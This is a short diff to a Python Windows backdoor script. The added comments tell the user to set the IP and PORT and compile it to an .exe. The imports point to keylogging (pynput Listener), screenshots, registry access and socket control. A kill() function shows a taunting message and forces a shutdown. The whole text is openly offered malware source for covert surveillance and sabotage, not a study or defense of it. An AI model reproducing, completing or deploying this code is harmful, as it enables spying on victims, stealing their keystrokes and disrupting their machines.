@@ -5,10 +5,16 @@
 #contact infos: 
 #email: rossiniroberto52@gmail.com
 #twitter: @rossin135
+
+########################################################
+#                         hints                        #
+# create a .exe file after change the IP and PORT vars #
+#        this backdoor just work in local network      #
+########################################################
+
 #github: https://github.com/rossiniroberto52
-import socket, os, subprocess, webbrowser, shutil
+import socket, os, subprocess, webbrowser, shutil, winreg
 from PIL import ImageGrab
-from winreg import *
 from pynput.keyboard import Key as key
 from pynput.keyboard import Listener
 from getpass import getuser
@@ -47,6 +53,9 @@ def storeKeysToFile(keys):
 def kill():
     os.system("msg %username% have a nice day and good luck fixing this pc")
     os.system("shutdown -s -t 3")
+
+
+
 
 def clone():
     try:
